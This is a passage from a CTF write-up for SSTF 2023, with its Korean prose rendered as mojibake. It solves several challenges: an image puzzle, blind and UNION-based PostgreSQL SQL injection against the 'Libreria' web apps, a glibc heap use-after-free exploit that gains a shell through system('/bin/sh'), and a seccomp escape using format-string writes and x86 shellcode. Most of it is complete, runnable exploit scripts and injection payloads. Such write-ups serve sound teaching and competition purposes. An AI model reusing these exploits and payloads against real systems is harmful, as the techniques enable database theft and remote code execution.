â‡’ íŠ¹ì • í”½ì…€ë“¤ì€ flagë¥¼ í‘œí˜„í•´ì•¼ í•˜ê¸° ë•Œë¬¸ì— í†µê³„ì ìœ¼ë¡œ flagë¥¼ í‘œí˜„í•˜ëŠ” .blockê³¼ ê·¸ë ‡ì§€ ì•Šì€ .blockì€ ì„œë¡œ ë‹¤ë¥¸ ë¹ˆë„ìˆ˜ë¥¼ ê°€ì§€ê³  ìˆì„ ê²ƒìœ¼ë¡œ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì‹¤ì œë¡œ ìœ„ ì´ë¯¸ì§€ì—ì„œ .blockì˜ ë¹ˆë„ìˆ˜ë¥¼ ì¸¡ì •í•˜ë©´ íŠ¹ì • .blockì€ 100 ê·¼ì²˜, ê·¸ë ‡ì§€ ì•Šì€ .blockì€ 800 ê·¼ì²˜ë¡œ ë‚˜íƒ€ë‚¬ìŠµë‹ˆë‹¤. ì´ì— ì°©ì•ˆí•˜ì—¬ flagë¥¼ í‘œí˜„í•˜ëŠ” .blockì€ 100 ê·¼ì²˜ì—ì„œ ë‚˜íƒ€ë‚œë‹¤ê³  íŒë‹¨í•˜ê³  ë¹ˆë„ ìˆ˜ê°€ 500ë³´ë‹¤ ë‚®ìœ¼ë©´ ë°±ìƒ‰, ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ í‘ìƒ‰ì„ ì¹ í–ˆìŠµë‹ˆë‹¤. 

scriptì—ì„œ ì»¬ëŸ¬ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆëŠ” .block ë²ˆí˜¸ì˜ ë²”ìœ„ê°€ [0,199]ì´ë¯€ë¡œ í‘, ë°± ë¶€ì—¬ ë˜í•œ ê·¸ ë²”ìœ„ ë‚´ì—ì„œ ì§„í–‰í–ˆìŠµë‹ˆë‹¤.

```diff
@@ -408,6 +408,8 @@
       .block397 { background-color: hsl(338, 41%, 70%) }    
       .block398 { background-color: hsl(346, 68%, 82%) }    
       .block399 { background-color: hsl(351, 84%, 45%) }    
+      .block400 { background-color: hsl(351, 0%, 0%) }  
+      .block401 { background-color: hsl(351, 100%, 100%) }
 
       .row {
         display: flex;
```

```python
f = open("index.html", "r").read()

res = []
for i in range(400):
    res.append(f.count("block"+str(i)+"'"))

print(res[:200])
print(res[200:])

for i in range(200):
    if res[i] > 500:
        f = f.replace("<div class='box block" + str(i)+"'></div>", "<div class='box block" + str(400)+"'></div>")
    else:
        f = f.replace("<div class='box block" + str(i)+"'></div>", "<div class='box block" + str(401)+"'></div>")

open("answer.html", "w").write(f)
```

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%202.png)

## Libreria

ì·¨ì•½ì ì€ rest.phpì—ì„œ ë°œìƒí•©ë‹ˆë‹¤.

cmdê°€ `requestbook` ì¼ ë•Œ, isbnì„ ê²€ìƒ‰í•´ ì´ë¯¸ DBì— ìˆëŠ” ë²ˆí˜¸ì´ë©° 10 ìë¦¬ê°€ ë„˜ì–´ê°€ëŠ” ê²½ìš° ì´ë¯¸ ì±…ì„ ê°€ì§€ê³  ìˆë‹¤ëŠ” ë©”ì‹œì§€ì™€ ë°›ì€ isbn ë²ˆí˜¸ë¥¼ ë„ì›Œì¤ë‹ˆë‹¤. 

ì´ ì„œë¹„ìŠ¤ì—ì„œ ì‚¬ìš©í•˜ëŠ” ë‹¤ë¥¸ ì¿¼ë¦¬ì˜ ê²½ìš° ì¸ìë¥¼ ë„£ì„ ë•Œ prepare statementë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— SQL injectionì´ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ `requestbook` ì„œë¹„ìŠ¤ì˜ ê²½ìš° isbnì˜ ê¸¸ì´ê°€ 10ê¸€ìë§Œ ë„˜ì–´ê°€ê¸°ë§Œ í•˜ë©´ ê·¸ëŒ€ë¡œ ì¿¼ë¦¬ì— ë„£ì–´ì£¼ê¸° ë•Œë¬¸ì— SQLiê°€ ë°œìƒí•©ë‹ˆë‹¤.

```php
case 'requestbook':
		if ((isset($_GET['isbn']) && strlen($_GET['isbn']) >= 10)) {
			$res = '{"res": "Sorry, but our budget is not enough to buy <a href=\'https://isbnsearch.org/isbn/'.$_GET['isbn'].'\'>this book</a>."}';
			$db = dbconnect();
			$result = pg_query($db, "SELECT ISBN FROM books WHERE isbn='".$_GET['isbn']."'");
			pg_close($db);
			if ($result) {
				$rows = pg_fetch_assoc($result);
				if ($rows) {
					$isbn = (int)$rows["isbn"];
					if (($isbn >= 1000000000) && ((string)$isbn === $rows["isbn"]))
					{
						$res = '{"res": "We already have this book('.$rows["isbn"].')."}';
					}
				}
			}
		}
```

ê·¸ëŸ¬ë‚˜, ê²°ê³¼ê°€ `$res` ë¥¼ ë°”ê¾¸ì§€ ëª»í•˜ê±°ë‚˜ invalid queryë¥¼ ë³´ë‚¼ ê²½ìš° `Sorry, but our ~~` ë¼ëŠ” ê²°ê³¼ë¥¼ ë„ì›ë‹ˆë‹¤. ì •í™•í•œ ì¿¼ë¦¬ë¬¸ì˜ ê²°ê³¼ê°€ ì•„ë‹Œ ì„±ê³µ ì—¬ë¶€ë§Œ ì•Œ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— blind sql injectionì„ ì‚¬ìš©í•˜ì˜€ìŠµë‹ˆë‹¤.

ì²˜ìŒì—ëŠ” mysqlì´ë¼ê³  ê°€ì •í•˜ê³  exploitì„ ì‹œë„í–ˆìœ¼ë‚˜, ì˜¤ë¥˜ê°€ ë°œìƒí•˜ì˜€ê³  ì´í›„ mysqlì´ ì•„ë‹Œ ***postgresql***ì„ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒì„ ê¹¨ë‹¬ì•˜ìŠµë‹ˆë‹¤. ì¿¼ë¦¬ë¥¼ postgresqlì—ì„œ ë™ì‘í•˜ë„ë¡ ìˆ˜ì •í•˜ì—¬ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

`LIMIT a,b â†’ LIMIT b OFFSET a`

ìµœì¢…ì ìœ¼ë¡œ ì‚¬ìš©í•œ ì¿¼ë¦¬ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

`1' or CASE WHEN (ASCII(substring((SELECT table_name from information_schema.tables WHERE table_schema='books' LIMIT 1 OFFSET 0),"+*str*(idx)+",1))="+*str*(val)+") THEN true ELSE false END-- -`

main dbì˜ ì´ë¦„ì€ `config.php` íŒŒì¼ì—ì„œ dbnameì„ `books` ë¡œ ì„¤ì •í•˜ëŠ” ë¶€ë¶„ì„ ë³´ê³  ì•Œì•„ëƒˆê³ , LIMIT OFFSETì„ í†µí•´ í•˜ë‚˜ì”© tableì„ ê²€ìƒ‰í•˜ë‹ˆ `adminonly` ì™€ `employee` ë¼ëŠ” ì´ë¦„ì˜ tableì„ ì°¾ì„ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

 ì´ ì¤‘ adminonlyì˜ ì¹¼ëŸ¼ì„ ë½‘ì•„ë³´ë©´,

`1' or CASE WHEN (ASCII(substring((SELECT column_name from information_schema.columns WHERE table_name='adminonly' LIMIT 1 OFFSET 0),"+*str*(idx)+",1))="+*str*(val)+") THEN true ELSE false END-- -`

`value` ë¼ëŠ” ì¹¼ëŸ¼ì— í”Œë˜ê·¸ê°€ ìˆì„ ê²ƒì´ë¼ ì˜ˆì¸¡í•˜ì—¬ í™•ì¸í•´ë³´ì•˜ìŠµë‹ˆë‹¤.

`1' or CASE WHEN (ASCII(substring((SELECT value from adminonly LIMIT 1 OFFSET 1),"+*str*(idx)+",1))>"+*str*(val)+") THEN true ELSE false END-- -`

OFFSETì„ 0ìœ¼ë¡œ ì£¼ê³  ë½‘ìœ¼ë©´ `Good job!` ì´ë¼ëŠ” ë¬¸êµ¬ë§Œ ëœ¨ê³  ëë‚˜ì§€ë§Œ, OFFSETì„ 1ë¡œ ì£¼ë©´ flagë¥¼ íšë“ í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

í”Œë˜ê·¸ë¥¼ ì¶”ì¶œí•˜ëŠ” ìµœì¢… payloadëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```python
from requests import get
from urllib import parse

URL = "http://libreria.sstf.site/rest.php?cmd=requestbook&isbn="
column_nm = ""

# # find each byte of columns with binary-search algorithm
# for i in range(1, 15):
#     left = 0
#     right = 128
#     while left <= right:
#         mid = (left+right)//2
#         r = get(URL+parse.quote("1' or CASE WHEN (ASCII(substring((SELECT column_name from information_schema.columns WHERE table_name='adminonly' LIMIT 1 OFFSET 2),"+str(i)+",1))="+str(mid)+") THEN true ELSE false END-- -"))
#         if "9781329837294" in r.text:
#             break
#         r = get(URL+parse.quote("1' or CASE WHEN (ASCII(substring((SELECT column_name from information_schema.columns WHERE table_name='adminonly' LIMIT 1 OFFSET 2),"+str(i)+",1))>"+str(mid)+") THEN true ELSE false END-- -"))
#         print("mid:", chr(mid))
#         print(r.text)
#         if "9781329837294" in r.text:
#             left = mid+1
#         else:
#             right = mid-1
#     print("found", chr(mid))
#     column_nm += chr(mid)
#    print("leaked :", column_nm)

# leak length of SCTF flag
r = get(URL+parse.quote("1' or CASE WHEN (char_length(SELECT value from adminonly LIMIT 1 OFFSET 1)=51) THEN true ELSE false END-- -"))
print(r.text)

flag = ""

# find each byte of flag with binary-search algorithm
for i in range(1, 100):
    left = 0
    right = 128
    while left <= right:
        mid = (left+right)//2
        r = get(URL+parse.quote("1' or CASE WHEN (ASCII(substring((SELECT value from adminonly LIMIT 1 OFFSET 1),"+str(i)+",1))="+str(mid)+") THEN true ELSE false END-- -"))
        if "9781329837294" in r.text:
            break
        r = get(URL+parse.quote("1' or CASE WHEN (ASCII(substring((SELECT value from adminonly LIMIT 1 OFFSET 1),"+str(i)+",1))>"+str(mid)+") THEN true ELSE false END-- -"))
        print("mid:", chr(mid))
        print(r.text)
        if "9781329837294" in r.text:
            left = mid+1
        else:
            right = mid-1
    print("found", chr(mid))
    flag += chr(mid)
    print("leaked :", flag)
```

**FLAG :** `SCTF{SQL_i5_4_l4n9uage_t0_man4G3_d4ta_1n_Da7aba$e5}` 

## Libreria Pro

ì´ì „ Libreriaì—ì„œ `rest.php` ì˜ ì·¨ì•½í•œ requestbookì´ ì‚¬ë¼ì§€ê³ ,
ëŒ€ì‹  search option ê¸°ëŠ¥ì´ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.

ìš°ì„  ìœ íš¨í•˜ì§€ ì•Šì€ pathì— ì ‘ê·¼í•˜ë‹ˆ ë‹¤ìŒê³¼ ê°™ì€ ì—ëŸ¬ í˜ì´ì§€ê°€ ë–´ìŠµë‹ˆë‹¤.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%203.png)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%204.png)

Apache ê¸°ë³¸ 404 pageê°€ ë‚˜ì˜¤ëŠ” ê²ƒì´ ì•„ë‹Œ, Django DEBUG MODEë¥¼ í†µí•´ ì—ëŸ¬ ë©”ì‹œì§€ê°€ ê·¸ëŒ€ë¡œ ë‚˜ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ ì¶”í›„ code leakì„ í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%205.png)

ì¼ë‹¨ ì´ì „ ë¬¸ì œì™€ ë‹¤ë¥¸ ì ì€  `search_with=title` ì˜ ì¡´ì¬ì…ë‹ˆë‹¤.
ìƒˆë¡œìš´ ê¸°ëŠ¥ì´ë‹ˆ ì—¬ê¸°ì—ì„œ ì·¨ì•½ì ì´ í„°ì§ˆ ê²ƒì´ë¼ê³  ìƒê°í–ˆê³ . ì´ê³³ì— `'` ë¥¼ ì§‘ì–´ë„£ì–´ í™•ì¸í–ˆìŠµë‹ˆë‹¤.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%206.png)

`Invalid Request` ë¥¼ ë±‰ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒìœ¼ë¡œëŠ” `search_with`ë¥¼ yearë¡œ ì„¤ì •í•˜ê³  Keywordì— int í˜•ì‹ì´ ì•„ë‹Œ ê±¸ ì§‘ì–´ë„£ì—ˆì„ ë•Œ ì–´ë–¤ í˜„ìƒì´ ì¼ì–´ë‚˜ëŠ”ì§€ í™•ì¸í–ˆìŠµë‹ˆë‹¤.

[http://libreriapro37657fd3.sstf.site/?key='&search_with=year&currency=krw](http://libreriapro37657fd3.sstf.site/?key=%27&search_with=year&currency=krw)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%207.png)

ë‹¤ìŒê³¼ ê°™ì´ ì˜¤ë¥˜ê°€ ëœ¨ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜¤ë¥˜ë¥¼ ì„¸ì„¸íˆ í™•ì¸í•´ë³´ë‹¤ Local varsì— `SQL_FILTER`ê°€ ì í˜€ìˆëŠ” `/root/libreria/impl/views.py` ê²½ë¡œì˜ tracebackì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%208.png)

```python
sqli_filters = [';', '/', '\\', '*', '=', '#', '&', '%', '<', '>', '^', '|', '$', '0X', '+', '~', '!', '@', 'TRUE', 'FALSE', 'OR', 'JOIN', 'DIV', 'LIKE', 'REGEXP', 'ST', 'CONVERT', 'IS', 'NOT', 'MATCH', 'BINARY', 'BETWEEN', 'ISNULL', 'ALIAS', 'ROUND', 'POW', 'LOAD', 'VERSION', 'LIMIT', 'OFFSET', 'ALL', 'ANY', 'EXISTS', 'SOME', 'IN']
```

ë˜í•œ, 40ë²ˆì§¸ ì¤„ì„ ëˆ„ë¥´ë©´ ì•ë’¤ë¡œ ì¡°ê¸ˆì”© code leakì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%209.png)

```python
  elif search_with == "title":
		search_res = Books.objects.filter(title__icontains=key)
	elif search_with == "author":
		search_res = Books.objects.filter(author__icontains=key)
	elif search_with == "publisher":
		search_res = Books.objects.filter(author__icontains=key)
	elif "year" in search_with or "month" in search_with:
		search_res = Books.objects.annotate(target=Extract('pubdate', search_with)).filter(target=key) â€¦
	elif search_with:
		books['res'] = "error"
	if search_res:
		books = {"books": [book for book in search_res if Books.isValidISBN(book.isbn)][:max_entries]}
```

leakí•œ ì½”ë“œë¥¼ ë³´ë©´ search_withì— `year` í˜¹ì€ `month` ë¼ëŠ” ë‹¨ì–´ê°€ ë“¤ì–´ê°”ì„ ë•Œ Extract ë¶€ë¶„ì— search_withê°€ ì§ì ‘ ë“¤ì–´ê°€ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

keyì— ìœ íš¨í•œ ë…„ë„ë¥¼ ë„£ê³ , search_withì— `year'` ë¥¼ ë„£ì–´ ì–´ë–¤ ì¿¼ë¦¬ë¡œ ë™ì‘í•˜ëŠ”ì§€ í™•ì¸í–ˆìŠµë‹ˆë‹¤.

[http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year'&currency=krw](http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year%27&currency=krw)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2010.png)

ë§ˆì§€ë§‰ tracebackì„ ë³´ë©´ ì–´ë–¤ sql queryë¥¼ ì‹¤í–‰í–ˆëŠ”ì§€ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. 

```python
SELECT "impl_books"."id", "impl_books"."title", "impl_books"."image","impl_books"."author", "impl_books"."price", "impl_books"."publisher","impl_books"."pubdate","impl_books"."isbn", "impl_books"."description",EXTRACT('year'' FROM "impl_books"."pubdate" AT TIME ZONE 'Asia/Tokyo') AS "target" FROM "impl_books" WHERE EXTRACT('year'' FROM "impl_books"."pubdate" AT TIME ZONE 'Asia/Tokyo') = %s(2016)
```

ì¶”ì¶œí•˜ëŠ” ì¹¼ëŸ¼ì˜ ì´ ê°¯ìˆ˜ëŠ” id, title, image, author, price, publisher, pubdate, isbn, description, pubdateì˜ year í•´ì„œ ì´ 10ê°œì´ë©°, ë‘ ë¶€ë¶„ì— ì…ë ¥í•œ `year'` ê°€ ë“¤ì–´ê°€ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì „ì— ë½‘ì•„ë†“ì€ sqli_filtersë¥¼ ìœ ì˜í•˜ì—¬ SQL injectionì„ ì§„í–‰í•˜ë©´ ë©ë‹ˆë‹¤.

search_with ìë¦¬ì— time zoneì„ ì œì™¸í•œ `year' from "impl_books"."pubdate") AS "target" FROM "impl_books"-- -` ë¥¼ ë„£ì–´ì£¼ì—ˆìŠµë‹ˆë‹¤. (time zoneì´ í•„í„°ë§ë˜ëŠ” `/` ë¥¼ ê°€ì§€ê³  ìˆê¸° ë•Œë¬¸ì—â€¦)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2011.png)

ì œëŒ€ë¡œ ì „ë¶€ ë½‘íˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
ê·¸ëŸ¼ ì´ë²ˆì—” information_schemaì—ì„œ ì›í•˜ëŠ” ë‚´ìš©ì„ ì¶”ì¶œí•´ë³´ì•˜ìŠµë‹ˆë‹¤.

Extractë¥¼ ì‚¬ìš©í•  ë•Œ timestampë¥¼ ì‚¬ìš©í•´ì•¼ë˜ê¸° ë•Œë¬¸ì— `::timestamp` ë¥¼ í†µí•´ í˜• ë³€í™˜ì„ í–ˆìŠµë‹ˆë‹¤.

`http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year' from "impl_books"."pubdate") AS "target" FROM "impl_books" WHERE false UNION SELECT '1',table_name,table_schema,table_schema,'5','6','2021-02-03 15:23:22.23242'::timestamp,'9781329837294','9','10' AS "target" from information_schema.tables where table_schema like 'books'-- -&currency=krw`

í•´ë‹¹ payloadë¥¼ ë§Œë“¤ ë•Œ, isbn ìë¦¬ì— `9781329837294` ë¥¼ ì£¼ì—ˆë˜ ì´ìœ ëŠ” isValidISBN í•¨ìˆ˜ë¥¼ í†µí•´ ìœ íš¨í•œ isbnì¼ ê²½ìš°ì—ë§Œ ê°ê°ì˜ rowë¥¼ booksì— ë„£ì–´ì£¼ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

```python
if search_res:
		books = {"books": [book for book in search_res if Books.isValidISBN(book.isbn)][:max_entries]}
```

ë˜í•œ, max_entriesì— ì˜í•´ 100ê°œì”© ëŠê¸°ê¸° ë•Œë¬¸ì— í•„í„°ë§ì„ ìì„¸íˆ ê±¸ì–´ì£¼ì–´ì•¼ í•©ë‹ˆë‹¤. (dbëª… ë“±)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2012.png)

 `impl_t0p5ecr3t` í…Œì´ë¸”ì´ ìˆ˜ìƒí•˜ë‹¤ê³  ìƒê°í•´ columnì„ ë½‘ì•„ë³´ì•˜ìŠµë‹ˆë‹¤.

`http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year' from "impl_books"."pubdate") AS "target" FROM "impl_books" WHERE false UNION SELECT '1',column_name,'3','4','5','6','2021-02-03 15:23:22.23242'::timestamp,'9781329837294','9','10' AS "target" from information_schema.columns where table_name like 'impl_t0p5ecr3t'-- -&currency=krw`

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2013.png)

id, key, valueê°€ ë‚˜ì™”ê³ , ì´ì „ ë¬¸ì œì—ì„œ valueì— í”Œë˜ê·¸ê°€ ìˆì–´ ë¨¼ì € valueë¥¼ í™•ì¸í•´ë³´ì•˜ìŠµë‹ˆë‹¤.

`http://libreriapro37657fd3.sstf.site/?key=2016&search_with=year' from "impl_books"."pubdate") AS "target" FROM "impl_books" WHERE false UNION SELECT '1','2','3',value,'5','6','2021-02-03 15:23:22.23242'::timestamp,'9781329837294','9','10' AS "target" from impl_t0p5ecr3t-- -&currency=krw`

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2014.png)

**FLAG :** `SCTF{L3ts_k3Ep_th3_veRs10n_0f_the_fr4mEwOrk_up_to_d4te}` 

## Heapster

ëŒ€í‘œì ì¸ ì·¨ì•½ì ì€ 3ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.

1. `alloc`ê³¼ `free`ìƒíƒœë¥¼ ë§ˆí‚¹í•´ êµ¬ë¶„í•˜ë‚˜, `print`ì‹œ êµ¬ë¶„ ì—†ì´ ì¶œë ¥í•´ì¤€ë‹¤
    1. í•´ë‹¹ ì·¨ì•½ì ì„ ì´ìš©í•´ `safe linking`ëœ `heap`ì˜ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆë‹¤
2. `alloc` â†’ `free` â†’ `alloc`ì„ í•˜ê²Œ ë˜ë©´, 2ë²ˆì§¸ `alloc`ì—ì„œ `UAF`ê°€ ë°œìƒí•œë‹¤.
    1. `1.a`ì—ì„œ ì•Œì•„ë‚¸ `heap`ì£¼ì†Œë¥¼ ì´ìš©í•˜ì—¬ `PROTECT_PTR` ì„ ìš°íšŒí•´ ì„ì˜ ì£¼ì†Œë¥¼ í• ë‹¹í•  ìˆ˜ ìˆë‹¤
3. `verify`ê³¼ì •ì—ì„œ `stack`ì— ë³µì‚¬í•œ ë‚´ìš©ì„ ì²­í¬ì˜ ë‚´ìš©ê³¼ ë¹„êµí•˜ëŠ”ë°, `arr[i*8+j]`ê°€ `stack`ì˜ ë²”ìœ„ë¥¼ ë„˜ì–´ê°„ë‹¤. ë”°ë¼ì„œ `stack`ìƒì— ìˆëŠ” ì„ì˜ì˜ ê°’ì„ ì–»ì„ ìˆ˜ ìˆë‹¤.

ë”°ë¼ì„œ ìµìŠ¤ ê³¼ì •ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.

1. `verify`ê³¼ì •ì„ ì´ìš©í•´ `libc`ì£¼ì†Œë¥¼ ì–»ëŠ”ë‹¤
2. `alloc(i)`â†’`alloc(i+1)`â†’`free(i)`â†’`free(i+1)`â†’`print()`ë¡œ `heap` ì£¼ì†Œë¥¼ ì–»ëŠ”ë‹¤
3. UAFë¥¼ í†µí•´ ì„ì˜ ì£¼ì†Œë¥¼ í• ë‹¹í•œë‹¤
    1. `alloc(i)`â†’`alloc(i+1)`â†’`free(i)`â†’`free(i+1)` â†’ `alloc(i+1)`
    2. `alloc(i+1)`ì— `PROTECT_PTR(base, <victim_ptr>)` ì‘ì„±
    3. `alloc(i+2)` â†’ `alloc(i+3)` 
    4. `alloc(i+3)` ì€ `<victim_ptr>`ìœ„ì¹˜ì— í• ë‹¹ë©ë‹ˆë‹¤.
4. `3`ì˜ í”„ë¦¬ë¯¸í‹°ë¸Œë¥¼ ì‚¬ìš©í•˜ì—¬ í›„ìˆ í•  ë°©ì‹ìœ¼ë¡œ ì›í•˜ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤

`exit`ì‹œ ë‚´ë¶€ì ìœ¼ë¡œ `__call_tls_dtors`ì„ í˜¸ì¶œí•˜ë¯€ë¡œ, `tls_dtor_list`ìœ„ì¹˜ì™€ `fs:[0x30]`ì— ì²­í¬ë¥¼ í• ë‹¹ë°›ê³  `cur->func=0x0, cur->obj=<binsh_addr>, fs:[0x30]=<system_address>`ì„ í•˜ë©´  `RCE`ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.

```jsx
void
__call_tls_dtors (void)
{
  while (tls_dtor_list)
    {
      struct dtor_list *cur = tls_dtor_list;
      dtor_func func = cur->func;
#ifdef PTR_DEMANGLE
      PTR_DEMANGLE (func);
#endif

      tls_dtor_list = tls_dtor_list->next;
      func (cur->obj);
```

**Payload**ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤

```jsx
from pwn import *

context.terminal = ['tmux', 'new-window']

def add(idx, data):
    p.sendlineafter("cmd: ", "1")
    p.sendline(str(idx))
    p.send(data.ljust(0x10, b"\x00"))

def delete(idx):
    p.sendlineafter("cmd: ", "2")
    p.sendline(str(idx))

def show():
    p.sendlineafter("cmd: ", "3")

def recover_safelink(safelink):
    protect = []
    recover = [0x0]
    for i in range(5):
        protect = [safelink&0xfff] + protect
        safelink >>= 12
    
    for i in range(0, 5):
        val = recover[i] ^ protect[i]
        recover += [val]

    heap_leak = 0
    for val in recover:
        heap_leak <<= 12
        heap_leak += val
    return heap_leak

def encrypt_ptr(base, ptr):
    return (base >> 12) ^ ptr
p = process("./chal")
p = remote("heapster.sstf.site", "31339")

# gdb.attach(p, """
# # b *(_dl_fini +488)
# b __GI___call_tls_dtors
# """)
libc = ELF("./libc.so.6")

# init_validate = "92eab7870b69dfb99c62db3ca075b222be8822a861bbfbbbc94f4b536682fe52"
# for i in range(0, len(init_validate), 0x8):
#     add(i, init_validate[i:i+0x10].encode())

libc_leak = b"\x90"
for i in range(0x4):
    for j in range(0x1, 0x100):
        add(0x15, libc_leak+j.to_bytes(1, "little"))
        p.sendlineafter("cmd: ", "4")
        if b"success" in p.recvline():
            libc_leak += j.to_bytes(1, "little")
            print(libc_leak)
            break
libc_leak += b"\x7f"
libc_base = u64(libc_leak.ljust(8, b"\x00")) - 0x29d90
print("libc_leak: ", hex(libc_base))

add(0x1e, b"A"*0x10)
add(0x1f, b"B"*0x10)
delete(0x1e)
delete(0x1f)
show()
p.recvuntil("->")
heap_leak = recover_safelink(u64(p.recvline()[:-1].ljust(8, b"\x00")))
print("heap_leak: ", hex(heap_leak))

add(0x1f, p64(encrypt_ptr(base=heap_leak, ptr=libc_base - 0x2920)))
add(0x1, p64(0x0) + b"/bin/sh\x00")
add(0x2, p64(0x0) + p64(libc_base + 0x21d000))# + p64(libc_base + 0xebcf5))

add(0x3, b"A"*0x10)
add(0x4, b"B"*0x10)
delete(0x3)
delete(0x4)
add(0x4, p64(encrypt_ptr(base=heap_leak, ptr=libc_base - 0x2890)))
add(0x5, p64(0x0)*2)
add(0x6, p64(libc_base + libc.symbols['system']))

add(0x7, b"A"*0x10)
add(0x8, b"B"*0x10)
delete(0x7)
delete(0x8)
add(0x8, p64(encrypt_ptr(base=heap_leak, ptr=libc_base + 0x21d000)))
add(0x9, p64(0x0)*2)
add(0xa, p64(0x0) +p64(libc_base + 0x1d8698))

p.sendlineafter("cmd: ", "0")
p.interactive()
```

**FLAG:** `SCTF{6470e394cbf6dab6a91682cc8585059b}`

## Escape

`seccomp_tools`ë¥¼ í†µí•´ ë¶„ì„í•´ ë³¸ ê²°ê³¼ `x86_64`ë¥¼ ê²€ì‚¬í•˜ì§€ ì•ŠìŒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2015.png)

ë”°ë¼ì„œ, `x86`ìœ¼ë¡œ `cs register`ì„ ëŒë¦° ë’¤ ìµìŠ¤í”Œë¡œì‡ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆê³ , ì´ë¥¼ ìœ„í•´ `retf`ë¥¼ ì´ìš©í•´ì•¼ í•©ë‹ˆë‹¤. `stack`ê³¼ `code`ì˜ì—­ì„ 4bytesìœ¼ë¡œ ë°”ê¾¼ í›„ stackì— `cs`, `eip`ë¥¼ ë„£ì€ ë’¤ `retf`í•˜ë©´ `x86`ëª¨ë“œì—ì„œ `syscall`ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´í›„ `ORW` ë¥¼ í†µí•´ ì›í•˜ëŠ” ë‚´ìš©ì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Payload**ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```jsx
from pwn import *

context.terminal = ['tmux', 'new-window']
# context.log_level = 'debug'
context.arch = 'i386'

e = ELF('./escape')
l = e.libc
# p = process(e.path)
p = remote("escape.sstf.site", "5051")
# gdb.attach(p, """
# brva 0x164A
# """)
# p = remote(HOST, PORT)

def aaw8(addr, value):
    assert (0 <= value and value < 0x100)
    payload = b''
    if value != 0:
        payload += f"%{value}c".encode()
    payload += b"%10$hhn"
    payload = payload.ljust(0x10, b'\x00')
    payload += p64(addr)
    assert (len(payload) < 0x80)
    p.recvuntil(b"Enter: \n")
    p.sendline(payload)

map_addr = 0x50510000

shellcode = b"\xBC\x00\x08\x51\x50\x67\xC7\x44\x24\x04\x23\x00\x00\x00\x67\xC7\x04\x24\x20\x00\x51\x50\xCB".ljust(0x20, b"\x90")
shellcode += asm(shellcraft.i386.open("./flag"))
shellcode += asm(shellcraft.i386.read(5, "esp", 41))
shellcode += asm(shellcraft.i386.write(1, "esp", 41))

for i, c in enumerate(shellcode):
    aaw8(map_addr + i, c)

p.sendline("done")
p.interactive()
```

